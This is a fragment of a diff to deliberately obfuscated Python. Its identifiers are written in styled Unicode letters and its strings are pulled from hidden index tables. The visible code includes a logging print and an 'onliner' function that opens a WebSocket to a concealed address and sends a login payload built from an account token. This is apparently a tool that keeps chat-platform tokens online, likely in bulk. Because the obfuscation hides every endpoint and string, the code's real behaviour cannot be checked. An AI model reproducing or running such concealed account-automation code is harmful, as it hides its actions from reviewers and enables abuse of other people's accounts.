-            𝙥𝗿𝗶𝗻𝙩(f"{𝗿}{𝙉𝗠𝗠𝙈𝘕𝙡𝙡𝘔𝗠𝙡𝙈𝗠𝘕𝘭𝙄𝗠𝘐𝙄𝙉𝙈𝙄𝙄𝘔𝘐𝙡𝘐𝙉𝙄𝗠𝙄𝗜𝙈[98]}{𝗱𝗮𝘵𝗲𝘁𝙞𝗺𝗲.datetime.now().strftime(f'{𝗴}{𝗡𝗠𝗠𝘔𝗡𝗹𝙡𝗠𝘔𝙡𝗠𝙈𝙉𝗹𝗜𝙈𝙄𝗜𝘕𝘔𝗜𝙄𝙈𝗜𝗹𝙄𝘕𝗜𝘔𝗜𝘐𝙈[99]}{𝙧}')}{𝙉𝙈𝙈𝘔𝗡𝗹𝘭𝘔𝗠𝘭𝘔𝘔𝙉𝗹𝙄𝘔𝙄𝘐𝘕𝗠𝗜𝗜𝗠𝘐𝗹𝙄𝗡𝘐𝘔𝗜𝙄𝘔[100]}{𝙧}{𝙉𝙈𝘔𝘔𝗡𝘭𝘭𝙈𝘔𝗹𝙈𝙈𝘕𝘭𝘐𝘔𝘐𝙄𝙉𝙈𝘐𝘐𝗠𝙄𝗹𝙄𝗡𝙄𝘔𝗜𝙄𝙈[98]}{𝘣}{𝙉𝘔𝘔𝘔𝘕𝗹𝙡𝘔𝘔𝘭𝙈𝗠𝙉𝙡𝗜𝗠𝘐𝗜𝙉𝘔𝘐𝗜𝗠𝗜𝙡𝙄𝙉𝗜𝙈𝘐𝘐𝗠[276]}{𝙧}{𝙉𝘔𝙈𝙈𝗡𝙡𝘭𝘔𝙈𝗹𝗠𝘔𝘕𝙡𝗜𝙈𝗜𝗜𝗡𝙈𝙄𝗜𝙈𝗜𝘭𝘐𝙉𝙄𝘔𝘐𝘐𝘔[100]}{𝗻𝗻}{𝙜}{𝗡𝗠𝘔𝙈𝘕𝘭𝘭𝙈𝙈𝗹𝙈𝘔𝘕𝗹𝙄𝙈𝗜𝗜𝗡𝙈𝙄𝙄𝙈𝙄𝗹𝘐𝙉𝙄𝘔𝗜𝘐𝘔[277]}{𝙧𝘳.text}{𝙉𝘔𝙈𝘔𝗡𝗹𝙡𝗠𝙈𝗹𝘔𝗠𝘕𝗹𝗜𝘔𝙄𝙄𝙉𝙈𝗜𝘐𝘔𝗜𝙡𝘐𝙉𝙄𝘔𝗜𝘐𝙈[105]}{𝗿𝗿.status_code}")
+            𝗽𝘳𝙞𝙣𝙩(f"{𝘳}{𝘐𝙉𝙄𝙉𝘭𝘭𝙄𝘔𝘐𝙄𝗹𝘔𝘭𝙡𝘐𝗹𝙡𝗡𝙉𝘐𝗹𝘭𝗠𝗡𝗹𝙉𝘭𝗠𝗜𝘔𝙄𝗠[91]}{𝗱𝘢𝘁𝙚𝘁𝗶𝗺𝙚.datetime.now().strftime(f'{𝙜}{𝙄𝗡𝗜𝗡𝗹𝘭𝗜𝘔𝘐𝙄𝘭𝘔𝙡𝙡𝘐𝙡𝗹𝘕𝙉𝗜𝘭𝙡𝗠𝗡𝙡𝗡𝗹𝙈𝘐𝗠𝗜𝘔[92]}{𝘳}')}{𝙄𝗡𝗜𝘕𝙡𝘭𝘐𝘔𝙄𝘐𝘭𝗠𝘭𝙡𝘐𝙡𝘭𝗡𝗡𝙄𝗹𝘭𝘔𝙉𝙡𝗡𝘭𝘔𝘐𝗠𝘐𝘔[93]}{𝘳}{𝗜𝙉𝘐𝙉𝗹𝙡𝗜𝙈𝗜𝘐𝙡𝘔𝙡𝘭𝙄𝗹𝘭𝗡𝙉𝗜𝗹𝘭𝙈𝘕𝙡𝗡𝗹𝗠𝗜𝘔𝘐𝘔[91]}{𝗯}{𝙄𝘕𝙄𝙉𝗹𝙡𝙄𝘔𝘐𝘐𝗹𝗠𝙡𝙡𝙄𝘭𝗹𝘕𝗡𝙄𝗹𝘭𝙈𝗡𝗹𝘕𝙡𝙈𝘐𝗠𝗜𝗠[269]}{𝙧}{𝙄𝗡𝙄𝘕𝗹𝗹𝘐𝘔𝙄𝘐𝗹𝙈𝗹𝘭𝘐𝙡𝙡𝙉𝗡𝙄𝘭𝗹𝗠𝘕𝗹𝙉𝙡𝘔𝘐𝗠𝙄𝘔[93]}{𝗻𝗻}{𝙜}{𝙄𝘕𝗜𝘕𝗹𝙡𝘐𝗠𝙄𝘐𝘭𝘔𝙡𝗹𝗜𝙡𝗹𝙉𝗡𝙄𝗹𝘭𝗠𝗡𝘭𝘕𝗹𝗠𝙄𝗠𝘐𝙈[270]}{𝗿𝘳.text}{𝙄𝙉𝗜𝗡𝗹𝙡𝘐𝙈𝗜𝙄𝗹𝙈𝘭𝙡𝙄𝘭𝗹𝙉𝗡𝗜𝗹𝘭𝙈𝗡𝙡𝘕𝗹𝗠𝗜𝗠𝗜𝘔[98]}{𝗿𝗿.status_code}")
 
 def onliner(token):
-    𝙨𝙩𝙖𝘵𝙪𝙨 = [𝙉𝘔𝙈𝙈𝗡𝙡𝘭𝘔𝙈𝘭𝘔𝙈𝙉𝘭𝙄𝗠𝘐𝗜𝙉𝘔𝗜𝘐𝙈𝗜𝘭𝘐𝗡𝗜𝙈𝗜𝘐𝘔[278], 𝙉𝘔𝘔𝘔𝗡𝙡𝗹𝙈𝙈𝘭𝗠𝘔𝗡𝙡𝘐𝘔𝘐𝙄𝘕𝗠𝘐𝘐𝘔𝙄𝙡𝗜𝘕𝘐𝘔𝙄𝘐𝗠[279], 𝗡𝙈𝘔𝘔𝙉𝘭𝗹𝗠𝗠𝙡𝙈𝘔𝙉𝘭𝙄𝗠𝙄𝙄𝙉𝘔𝙄𝙄𝗠𝙄𝘭𝗜𝙉𝙄𝙈𝗜𝘐𝘔[280]]
-    𝘸𝙨 = 𝙬𝘦𝙗𝘀𝗼𝙘𝙠𝘦𝙩.WebSocket()
-    𝘸𝘀.connect(𝗡𝗠𝘔𝙈𝙉𝗹𝙡𝗠𝗠𝘭𝗠𝙈𝗡𝙡𝙄𝘔𝙄𝙄𝘕𝙈𝙄𝗜𝙈𝗜𝙡𝗜𝘕𝙄𝗠𝙄𝙄𝙈[281])
-    𝗿𝘳 = 𝘄𝘴.recv()
-    𝘦𝘷𝗲𝘯𝙩 = 𝙟𝘀𝗼𝘯.loads(𝗿𝗿)
-    𝗵𝗲𝙖𝙧𝘵𝗯𝗲𝗮𝘁_𝗶𝘯𝙩𝗲𝘳𝘷𝙖𝙡 = 𝘦𝘷𝙚𝘯𝙩[𝙉𝙈𝘔𝙈𝘕𝙡𝙡𝗠𝗠𝙡𝘔𝙈𝙉𝘭𝗜𝗠𝙄𝙄𝗡𝙈𝘐𝙄𝙈𝘐𝙡𝙄𝗡𝘐𝗠𝘐𝙄𝙈[173]][𝗡𝗠𝙈𝘔𝘕𝘭𝙡𝗠𝗠𝙡𝗠𝙈𝗡𝙡𝘐𝘔𝘐𝘐𝗡𝗠𝗜𝗜𝗠𝙄𝗹𝙄𝗡𝗜𝗠𝙄𝘐𝙈[206]] / 1000
-    𝗮𝘂𝘵𝗵 = {𝗡𝗠𝙈𝙈𝙉𝘭𝙡𝙈𝗠𝙡𝗠𝘔𝗡𝘭𝗜𝙈𝙄𝘐𝙉𝙈𝘐𝙄𝗠𝘐𝙡𝘐𝗡𝙄𝗠𝘐𝙄𝗠[176]: 2, 𝙉𝗠𝙈𝗠𝙉𝗹𝘭𝗠𝗠𝘭𝘔𝘔𝙉𝗹𝘐𝘔𝘐𝘐𝙉𝙈𝙄𝗜𝙈𝗜𝙡𝗜𝙉𝘐𝙈𝗜𝗜𝗠[173]: {𝗡𝗠𝗠𝗠𝘕𝙡𝘭𝗠𝗠𝘭𝘔𝗠𝘕𝙡𝗜𝘔𝘐𝙄𝙉𝙈𝙄𝙄𝘔𝗜𝙡𝗜𝙉𝙄𝗠𝙄𝗜𝗠[260]: 𝙩𝗼𝙠𝙚𝘯, 𝗡𝙈𝘔𝗠𝙉𝙡𝙡𝗠𝙈𝗹𝘔𝗠𝗡𝘭𝘐𝙈𝘐𝘐𝙉𝗠𝗜𝘐𝙈𝘐𝘭𝙄𝙉𝘐𝘔𝙄𝙄𝙈[282]: 61, 𝗡𝙈𝙈𝙈𝘕𝘭𝙡𝘔𝘔𝙡𝗠𝗠𝗡𝘭𝗜𝙈𝗜𝗜𝙉𝘔𝗜𝘐𝙈𝘐𝗹𝗜𝙉𝘐𝘔𝗜𝗜𝙈[261]: {𝗡𝙈𝗠𝗠𝙉𝙡𝗹𝘔𝙈𝘭𝙈𝘔𝘕𝗹𝙄𝙈𝘐𝙄𝘕𝙈𝘐𝘐𝙈𝘐𝘭𝗜𝘕𝙄𝙈𝙄𝗜𝘔[113]: 𝗡𝙈𝗠𝘔𝗡𝙡𝘭𝗠𝘔𝘭𝙈𝙈𝘕𝗹𝗜𝘔𝙄𝗜𝗡𝗠𝙄𝘐𝗠𝗜𝗹𝙄𝙉𝙄𝙈𝗜𝘐𝙈[125], 𝙉𝗠𝗠𝘔𝘕𝙡𝘭𝙈𝙈𝙡𝗠𝙈𝘕𝙡𝘐𝗠𝙄𝗜𝗡𝙈𝘐𝙄𝘔𝗜𝙡𝗜𝗡𝙄𝘔𝗜𝘐𝙈[114]: 𝘕𝙈𝘔𝗠𝙉𝙡𝗹𝘔𝙈𝘭𝗠𝘔𝙉𝗹𝘐𝙈𝘐𝙄𝙉𝙈𝙄𝙄𝗠𝙄𝘭𝘐𝘕𝗜𝙈𝗜𝗜𝘔[291], 𝘕𝗠𝗠𝗠𝘕𝙡𝗹𝘔𝗠𝘭𝘔𝗠𝗡𝙡𝙄𝙈𝙄𝘐𝙉𝙈𝙄𝘐𝘔𝘐𝙡𝙄𝙉𝗜𝗠𝘐𝗜𝘔[286]: 𝗡𝙈𝗠𝘔𝗡𝘭𝘭𝙈𝗠𝙡𝗠𝘔𝘕𝙡𝙄𝗠𝗜𝘐𝘕𝘔𝗜𝘐𝘔𝘐𝘭𝘐𝙉𝗜𝙈𝘐𝗜𝙈[29], 𝙉𝙈𝙈𝙈𝙉𝗹𝗹𝘔𝙈𝗹𝗠𝙈𝘕𝘭𝗜𝙈𝘐𝘐𝙉𝙈𝙄𝘐𝙈𝘐𝘭𝙄𝙉𝙄𝘔𝗜𝗜𝘔[119]: 𝘕𝘔𝗠𝘔𝙉𝙡𝙡𝘔𝘔𝘭𝘔𝘔𝗡𝗹𝙄𝙈𝙄𝘐𝘕𝗠𝘐𝘐𝘔𝘐𝘭𝗜𝗡𝘐𝙈𝘐𝙄𝗠[292], 𝙉𝘔𝘔𝘔𝘕𝗹𝘭𝗠𝙈𝗹𝘔𝙈𝘕𝙡𝘐𝗠𝘐𝗜𝘕𝗠𝙄𝘐𝙈𝙄𝘭𝘐𝘕𝘐𝘔𝘐𝗜𝗠[120]: 𝗡𝘔𝙈𝙈𝗡𝙡𝙡𝙈𝘔𝗹𝙈𝗠𝗡𝙡𝙄𝗠𝘐𝙄𝙉𝙈𝗜𝗜𝙈𝙄𝘭𝙄𝗡𝙄𝘔𝙄𝙄𝙈[293], 𝗡𝙈𝙈𝗠𝙉𝘭𝙡𝘔𝗠𝗹𝙈𝘔𝘕𝘭𝘐𝗠𝘐𝗜𝗡𝙈𝘐𝘐𝘔𝙄𝗹𝗜𝘕𝙄𝘔𝘐𝘐𝗠[121]: 𝘕𝘔𝙈𝘔𝗡𝙡𝘭𝗠𝘔𝙡𝗠𝘔𝘕𝗹𝙄𝗠𝘐𝙄𝘕𝘔𝘐𝙄𝗠𝙄𝗹𝗜𝘕𝘐𝘔𝗜𝗜𝗠[294], 𝗡𝙈𝗠𝗠𝘕𝙡𝙡𝙈𝙈𝙡𝘔𝘔𝙉𝙡𝙄𝙈𝙄𝙄𝗡𝗠𝗜𝗜𝗠𝙄𝘭𝘐𝗡𝗜𝗠𝗜𝗜𝗠[117]: 𝙉𝗠𝘔𝗠𝘕𝗹𝘭𝗠𝙈𝘭𝙈𝙈𝗡𝘭𝗜𝙈𝘐𝗜𝗡𝘔𝗜𝙄𝗠𝗜𝗹𝗜𝘕𝘐𝙈𝙄𝗜𝙈[295], 𝙉𝙈𝗠𝙈𝙉𝗹𝙡𝘔𝗠𝗹𝙈𝘔𝘕𝙡𝗜𝗠𝗜𝗜𝗡𝙈𝘐𝙄𝘔𝙄𝙡𝗜𝘕𝘐𝙈𝙄𝗜𝘔[287]: 𝘕𝘔𝗠𝗠𝗡𝗹𝙡𝗠𝙈𝙡𝘔𝘔𝘕𝗹𝙄𝘔𝙄𝘐𝘕𝗠𝙄𝗜𝘔𝙄𝗹𝗜𝙉𝗜𝙈𝘐𝙄𝗠[29], 𝙉𝘔𝙈𝗠𝘕𝙡𝘭𝘔𝗠𝗹𝙈𝘔𝘕𝗹𝙄𝙈𝘐𝗜𝘕𝘔𝗜𝘐𝙈𝗜𝘭𝗜𝘕𝗜𝗠𝘐𝗜𝗠[288]: 𝗡𝗠𝙈𝗠𝙉𝘭𝘭𝘔𝙈𝗹𝗠𝗠𝗡𝘭𝙄𝗠𝙄𝘐𝗡𝘔𝘐𝙄𝗠𝗜𝗹𝙄𝘕𝗜𝗠𝙄𝙄𝘔[29], 𝙉𝙈𝗠𝗠𝘕𝙡𝗹𝗠𝘔𝙡𝙈𝘔𝘕𝙡𝙄𝗠𝗜𝗜𝗡𝗠𝙄𝘐𝘔𝗜𝙡𝘐𝗡𝙄𝙈𝘐𝙄𝘔[289]: 𝘕𝘔𝘔𝗠𝙉𝙡𝘭𝙈𝘔𝗹𝘔𝙈𝙉𝙡𝘐𝗠𝙄𝗜𝘕𝘔𝘐𝗜𝗠𝘐𝙡𝙄𝗡𝙄𝗠𝘐𝙄𝘔[29], 𝘕𝙈𝘔𝙈𝘕𝗹𝗹𝙈𝘔𝗹𝗠𝙈𝙉𝗹𝙄𝗠𝙄𝘐𝗡𝘔𝗜𝙄𝗠𝙄𝗹𝗜𝗡𝙄𝘔𝙄𝙄𝙈[290]: 𝙉𝙈𝘔𝗠𝘕𝙡𝙡𝙈𝙈𝗹𝘔𝗠𝙉𝗹𝙄𝗠𝙄𝙄𝗡𝗠𝙄𝙄𝙈𝙄𝗹𝙄𝙉𝘐𝗠𝙄𝘐𝘔[29], 𝗡𝙈𝗠𝘔𝙉𝙡𝘭𝙈𝙈𝙡𝗠𝘔𝘕𝙡𝗜𝗠𝙄𝘐𝙉𝘔𝗜𝘐𝘔𝗜𝘭𝘐𝗡𝘐𝘔𝗜𝗜𝘔[115]: 𝘕𝙈𝗠𝗠𝗡𝗹𝗹𝗠𝗠𝗹𝗠𝗠𝙉𝗹𝘐𝘔𝙄𝗜𝘕𝘔𝙄𝘐𝗠𝘐𝙡𝗜𝗡𝗜𝗠𝘐𝗜𝗠[127], 𝗡𝙈𝙈𝗠𝗡𝗹𝘭𝗠𝘔𝘭𝙈𝙈𝘕𝙡𝘐𝙈𝗜𝗜𝗡𝙈𝘐𝘐𝗠𝘐𝘭𝗜𝘕𝘐𝘔𝙄𝙄𝗠[122]: 𝘕𝙈𝗠𝗠𝙉𝙡𝘭𝘔𝘔𝙡𝘔𝙈𝙉𝘭𝗜𝘔𝗜𝘐𝙉𝘔𝗜𝘐𝙈𝙄𝗹𝘐𝘕𝗜𝗠𝘐𝙄𝙈[296], 𝙉𝗠𝘔𝙈𝘕𝗹𝙡𝙈𝘔𝘭𝙈𝗠𝘕𝙡𝘐𝙈𝙄𝘐𝘕𝙈𝗜𝗜𝗠𝘐𝙡𝘐𝗡𝘐𝗠𝗜𝙄𝙈[124]: 𝘕𝘔𝗠𝗠𝙉𝙡𝙡𝙈𝗠𝗹𝙈𝘔𝗡𝙡𝙄𝗠𝙄𝙄𝙉𝗠𝗜𝗜𝘔𝗜𝘭𝘐𝗡𝗜𝗠𝙄𝗜𝗠[297]}, 𝙉𝙈𝗠𝘔𝗡𝗹𝙡𝙈𝙈𝙡𝗠𝗠𝙉𝘭𝙄𝘔𝙄𝗜𝗡𝗠𝙄𝘐𝙈𝙄𝙡𝙄𝙉𝗜𝘔𝗜𝙄𝗠[283]: {𝙉𝗠𝘔𝘔𝘕𝘭𝙡𝙈𝗠𝗹𝙈𝙈𝙉𝗹𝙄𝘔𝙄𝘐𝘕𝗠𝙄𝗜𝗠𝗜𝘭𝙄𝙉𝙄𝙈𝙄𝗜𝘔[298]: 𝘳𝙖𝗻𝙙𝘰𝙢.choice(𝘴𝙩𝘢𝘵𝘶𝙨), 𝗡𝘔𝗠𝗠𝘕𝙡𝘭𝙈𝘔𝘭𝘔𝗠𝘕𝗹𝘐𝙈𝗜𝙄𝗡𝗠𝙄𝗜𝘔𝘐𝗹𝗜𝙉𝘐𝘔𝙄𝙄𝘔[299]: 0, 𝗡𝗠𝗠𝙈𝗡𝗹𝘭𝗠𝗠𝘭𝘔𝗠𝘕𝙡𝗜𝘔𝗜𝘐𝙉𝙈𝗜𝙄𝘔𝘐𝘭𝘐𝗡𝙄𝙈𝙄𝘐𝗠[300]: [], 𝘕𝘔𝘔𝙈𝙉𝗹𝙡𝙈𝗠𝙡𝗠𝙈𝘕𝙡𝙄𝘔𝙄𝙄𝙉𝘔𝘐𝙄𝘔𝙄𝙡𝗜𝗡𝗜𝘔𝘐𝙄𝙈[301]: False}, 𝗡𝗠𝙈𝘔𝗡𝘭𝘭𝗠𝘔𝙡𝙈𝙈𝘕𝗹𝗜𝙈𝗜𝙄𝙉𝘔𝘐𝗜𝗠𝙄𝗹𝘐𝘕𝙄𝘔𝙄𝘐𝙈[284]: False, 𝗡𝘔𝘔𝘔𝘕𝗹𝘭𝙈𝘔𝙡𝘔𝘔𝘕𝙡𝙄𝗠𝙄𝙄𝙉𝘔𝗜𝗜𝗠𝙄𝗹𝗜𝗡𝘐𝘔𝗜𝙄𝙈[285]: {𝘕𝙈𝘔𝘔𝙉𝘭𝙡𝘔𝙈𝗹𝙈𝗠𝘕𝗹𝘐𝙈𝗜𝘐𝘕𝗠𝙄𝙄𝙈𝙄𝙡𝘐𝙉𝙄𝙈𝘐𝗜𝘔[302]: {}, 𝗡𝗠𝘔𝙈𝘕𝘭𝘭𝙈𝗠𝗹𝗠𝘔𝗡𝘭𝘐𝘔𝘐𝙄𝗡𝙈𝘐𝘐𝙈𝙄𝘭𝙄𝙉𝗜𝗠𝙄𝙄𝙈[303]: 𝙉𝘔𝙈𝘔𝗡𝗹𝙡𝙈𝘔𝘭𝗠𝗠𝙉𝗹𝙄𝗠𝗜𝘐𝘕𝙈𝘐𝙄𝗠𝗜𝘭𝗜𝘕𝘐𝘔𝘐𝙄𝙈[238], 𝘕𝗠𝘔𝙈𝗡𝙡𝙡𝘔𝗠𝙡𝗠𝗠𝘕𝙡𝗜𝘔𝙄𝗜𝗡𝙈𝗜𝘐𝗠𝘐𝘭𝘐𝙉𝘐𝘔𝗜𝗜𝙈[304]: 0, 𝗡𝗠𝙈𝙈𝗡𝗹𝙡𝘔𝙈𝗹𝘔𝙈𝘕𝗹𝗜𝘔𝘐𝗜𝙉𝘔𝘐𝘐𝙈𝗜𝘭𝘐𝙉𝙄𝘔𝗜𝗜𝙈[305]: -1}}}
-    𝙬𝘀.send(𝙟𝘴𝗼𝗻.dumps(𝗮𝘶𝘵𝙝))
+    𝘀𝘵𝗮𝘁𝘂𝘀 = [𝙄𝙉𝙄𝗡𝘭𝘭𝙄𝗠𝗜𝙄𝙡𝘔𝙡𝙡𝘐𝙡𝙡𝗡𝘕𝙄𝙡𝘭𝘔𝗡𝙡𝗡𝘭𝘔𝙄𝙈𝙄𝘔[271], 𝗜𝗡𝘐𝗡𝘭𝗹𝗜𝘔𝙄𝘐𝙡𝘔𝗹𝗹𝘐𝘭𝘭𝗡𝗡𝗜𝙡𝘭𝗠𝗡𝙡𝙉𝘭𝗠𝘐𝙈𝙄𝙈[272], 𝗜𝗡𝙄𝘕𝙡𝘭𝙄𝘔𝙄𝗜𝙡𝙈𝙡𝙡𝙄𝗹𝙡𝗡𝗡𝙄𝙡𝗹𝘔𝙉𝘭𝗡𝙡𝗠𝙄𝘔𝘐𝘔[273]]
+    𝙬𝘴 = 𝘄𝘦𝘣𝘀𝘰𝙘𝙠𝙚𝙩.WebSocket()
+    𝙬𝘴.connect(𝙄𝙉𝘐𝘕𝘭𝙡𝘐𝙈𝙄𝗜𝗹𝙈𝗹𝗹𝘐𝗹𝘭𝘕𝘕𝙄𝙡𝘭𝙈𝗡𝙡𝗡𝘭𝘔𝗜𝘔𝗜𝗠[274])
+    𝙧𝗿 = 𝘸𝙨.recv()
+    𝘦𝙫𝗲𝗻𝘁 = 𝙟𝘀𝙤𝗻.loads(𝘳𝙧)
+    𝙝𝗲𝙖𝗿𝘵𝙗𝘦𝘢𝙩_𝘪𝙣𝘵𝙚𝘳𝘃𝗮𝗹 = 𝗲𝙫𝗲𝙣𝘁[𝙄𝗡𝘐𝘕𝗹𝙡𝘐𝙈𝗜𝙄𝗹𝗠𝙡𝗹𝙄𝗹𝘭𝘕𝘕𝙄𝗹𝙡𝘔𝙉𝘭𝗡𝗹𝙈𝗜𝘔𝘐𝘔[166]][𝙄𝘕𝘐𝘕𝗹𝗹𝘐𝗠𝘐𝘐𝘭𝙈𝙡𝙡𝙄𝘭𝗹𝙉𝙉𝗜𝗹𝘭𝙈𝘕𝘭𝙉𝘭𝙈𝘐𝗠𝙄𝗠[199]] / 1000
+    𝗮𝙪𝘁𝙝 = {𝘐𝘕𝘐𝘕𝗹𝙡𝘐𝙈𝙄𝘐𝙡𝘔𝘭𝙡𝙄𝙡𝘭𝘕𝘕𝗜𝘭𝘭𝙈𝗡𝘭𝗡𝗹𝗠𝗜𝘔𝙄𝗠[169]: 2, 𝗜𝗡𝘐𝘕𝗹𝘭𝗜𝙈𝙄𝘐𝗹𝙈𝗹𝙡𝗜𝙡𝘭𝙉𝙉𝗜𝙡𝘭𝗠𝗡𝗹𝘕𝙡𝗠𝙄𝗠𝗜𝘔[166]: {𝙄𝗡𝙄𝗡𝘭𝗹𝘐𝘔𝙄𝙄𝙡𝗠𝘭𝘭𝗜𝗹𝙡𝘕𝙉𝘐𝗹𝗹𝘔𝗡𝙡𝙉𝘭𝗠𝙄𝙈𝗜𝘔[253]: 𝘵𝘰𝗸𝗲𝘯, 𝙄𝙉𝗜𝙉𝙡𝙡𝗜𝘔𝙄𝘐𝘭𝘔𝗹𝙡𝘐𝙡𝘭𝗡𝙉𝙄𝘭𝘭𝘔𝗡𝙡𝗡𝙡𝙈𝙄𝗠𝗜𝙈[275]: 61, 𝗜𝙉𝘐𝙉𝘭𝙡𝗜𝙈𝘐𝘐𝙡𝘔𝗹𝗹𝙄𝗹𝙡𝙉𝘕𝗜𝘭𝙡𝙈𝘕𝙡𝘕𝙡𝗠𝗜𝘔𝙄𝗠[254]: {𝗜𝙉𝙄𝘕𝘭𝗹𝘐𝗠𝗜𝗜𝗹𝗠𝙡𝙡𝘐𝗹𝘭𝗡𝙉𝗜𝗹𝙡𝗠𝗡𝙡𝗡𝘭𝙈𝗜𝙈𝘐𝗠[106]: 𝙄𝗡𝙄𝘕𝘭𝘭𝘐𝙈𝘐𝗜𝙡𝗠𝗹𝙡𝙄𝘭𝙡𝙉𝘕𝗜𝗹𝗹𝙈𝘕𝙡𝙉𝙡𝗠𝘐𝗠𝗜𝘔[118], 𝗜𝗡𝗜𝗡𝙡𝗹𝘐𝙈𝘐𝙄𝘭𝙈𝙡𝗹𝘐𝗹𝙡𝙉𝘕𝘐𝗹𝙡𝘔𝘕𝘭𝗡𝙡𝗠𝘐𝙈𝗜𝙈[107]: 𝘐𝗡𝘐𝗡𝙡𝗹𝗜𝘔𝘐𝗜𝙡𝗠𝙡𝘭𝗜𝘭𝘭𝗡𝙉𝗜𝘭𝘭𝙈𝘕𝙡𝘕𝙡𝗠𝙄𝗠𝙄𝘔[284], 𝗜𝙉𝗜𝗡𝗹𝘭𝗜𝗠𝘐𝙄𝗹𝘔𝘭𝙡𝙄𝙡𝗹𝗡𝗡𝙄𝙡𝗹𝙈𝙉𝘭𝗡𝗹𝗠𝘐𝘔𝗜𝘔[279]: 𝘐𝙉𝘐𝘕𝗹𝗹𝗜𝗠𝘐𝙄𝙡𝗠𝘭𝙡𝗜𝗹𝗹𝗡𝙉𝘐𝘭𝘭𝙈𝙉𝗹𝗡𝘭𝙈𝗜𝗠𝘐𝗠[22], 𝙄𝗡𝙄𝗡𝘭𝘭𝘐𝙈𝗜𝘐𝙡𝘔𝗹𝗹𝙄𝗹𝙡𝗡𝗡𝘐𝙡𝙡𝘔𝗡𝗹𝘕𝗹𝘔𝙄𝗠𝙄𝘔[112]: 𝘐𝘕𝗜𝙉𝙡𝘭𝘐𝗠𝘐𝙄𝙡𝙈𝘭𝙡𝘐𝙡𝙡𝙉𝗡𝙄𝗹𝘭𝗠𝙉𝗹𝙉𝘭𝗠𝙄𝗠𝘐𝗠[285], 𝙄𝙉𝙄𝙉𝙡𝗹𝗜𝘔𝗜𝘐𝘭𝗠𝙡𝙡𝗜𝘭𝗹𝘕𝘕𝙄𝘭𝗹𝙈𝗡𝘭𝙉𝙡𝘔𝙄𝙈𝘐𝙈[113]: 𝘐𝘕𝗜𝘕𝘭𝙡𝗜𝙈𝘐𝗜𝗹𝗠𝗹𝙡𝗜𝘭𝙡𝘕𝗡𝘐𝘭𝙡𝗠𝗡𝗹𝙉𝗹𝗠𝙄𝗠𝘐𝘔[286], 𝘐𝘕𝘐𝙉𝙡𝗹𝙄𝗠𝙄𝗜𝘭𝘔𝘭𝘭𝘐𝙡𝘭𝗡𝘕𝙄𝙡𝗹𝘔𝘕𝙡𝘕𝘭𝘔𝘐𝘔𝙄𝘔[114]: 𝘐𝘕𝙄𝗡𝙡𝙡𝘐𝗠𝙄𝗜𝗹𝗠𝘭𝗹𝘐𝗹𝙡𝙉𝗡𝗜𝗹𝙡𝘔𝙉𝗹𝙉𝗹𝘔𝙄𝗠𝘐𝘔[287], 𝗜𝗡𝘐𝙉𝗹𝙡𝗜𝗠𝗜𝗜𝙡𝘔𝗹𝙡𝘐𝙡𝙡𝘕𝗡𝗜𝗹𝗹𝘔𝗡𝗹𝗡𝗹𝘔𝙄𝘔𝗜𝙈[110]: 𝙄𝙉𝘐𝙉𝘭𝗹𝙄𝙈𝘐𝙄𝙡𝙈𝗹𝗹𝙄𝗹𝗹𝙉𝙉𝘐𝘭𝗹𝙈𝗡𝗹𝙉𝘭𝘔𝙄𝘔𝗜𝙈[288], 𝘐𝗡𝙄𝙉𝗹𝘭𝙄𝘔𝘐𝘐𝗹𝘔𝙡𝙡𝘐𝗹𝙡𝙉𝗡𝘐𝗹𝙡𝘔𝗡𝗹𝗡𝗹𝘔𝗜𝘔𝘐𝗠[280]: 𝗜𝘕𝗜𝗡𝗹𝙡𝙄𝘔𝗜𝘐𝘭𝙈𝘭𝘭𝗜𝘭𝗹𝘕𝙉𝘐𝙡𝗹𝙈𝗡𝙡𝗡𝗹𝙈𝗜𝗠𝗜𝙈[22], 𝗜𝗡𝘐𝘕𝘭𝙡𝘐𝘔𝘐𝙄𝗹𝗠𝘭𝙡𝗜𝗹𝙡𝘕𝘕𝗜𝙡𝘭𝘔𝗡𝗹𝘕𝘭𝗠𝙄𝘔𝙄𝘔[281]: 𝗜𝘕𝗜𝙉𝙡𝘭𝗜𝙈𝗜𝗜𝗹𝘔𝘭𝗹𝘐𝗹𝘭𝙉𝗡𝗜𝙡𝙡𝙈𝙉𝙡𝙉𝘭𝘔𝙄𝘔𝙄𝗠[22], 𝘐𝗡𝘐𝘕𝗹𝗹𝘐𝘔𝘐𝙄𝙡𝘔𝘭𝙡𝘐𝘭𝗹𝙉𝗡𝙄𝘭𝘭𝙈𝘕𝙡𝗡𝘭𝗠𝗜𝗠𝙄𝗠[282]: 𝙄𝘕𝗜𝙉𝘭𝙡𝙄𝘔𝙄𝙄𝙡𝙈𝗹𝙡𝘐𝘭𝙡𝗡𝙉𝗜𝘭𝘭𝗠𝘕𝙡𝘕𝗹𝗠𝘐𝙈𝗜𝗠[22], 𝙄𝘕𝙄𝗡𝙡𝗹𝗜𝗠𝗜𝘐𝘭𝗠𝙡𝘭𝘐𝘭𝗹𝙉𝘕𝗜𝘭𝘭𝙈𝘕𝗹𝗡𝘭𝗠𝙄𝗠𝗜𝙈[283]: 𝗜𝗡𝙄𝘕𝙡𝗹𝗜𝘔𝙄𝘐𝘭𝘔𝘭𝗹𝙄𝗹𝘭𝙉𝗡𝙄𝗹𝙡𝙈𝘕𝙡𝗡𝙡𝙈𝗜𝘔𝗜𝗠[22], 𝘐𝘕𝘐𝗡𝗹𝙡𝗜𝙈𝘐𝗜𝗹𝗠𝙡𝗹𝘐𝗹𝘭𝗡𝘕𝗜𝘭𝗹𝗠𝗡𝘭𝗡𝘭𝗠𝗜𝘔𝗜𝙈[108]: 𝗜𝙉𝘐𝙉𝗹𝘭𝗜𝘔𝙄𝗜𝙡𝗠𝗹𝗹𝘐𝘭𝘭𝗡𝙉𝙄𝗹𝗹𝙈𝙉𝗹𝘕𝗹𝗠𝘐𝙈𝗜𝘔[120], 𝗜𝙉𝙄𝗡𝘭𝗹𝗜𝘔𝗜𝘐𝙡𝙈𝗹𝘭𝙄𝙡𝙡𝙉𝗡𝙄𝗹𝙡𝗠𝗡𝙡𝘕𝘭𝗠𝘐𝘔𝙄𝘔[115]: 𝙄𝘕𝙄𝘕𝘭𝘭𝙄𝗠𝗜𝗜𝗹𝘔𝘭𝗹𝙄𝙡𝘭𝙉𝙉𝙄𝗹𝗹𝗠𝙉𝘭𝙉𝗹𝗠𝙄𝙈𝗜𝘔[289], 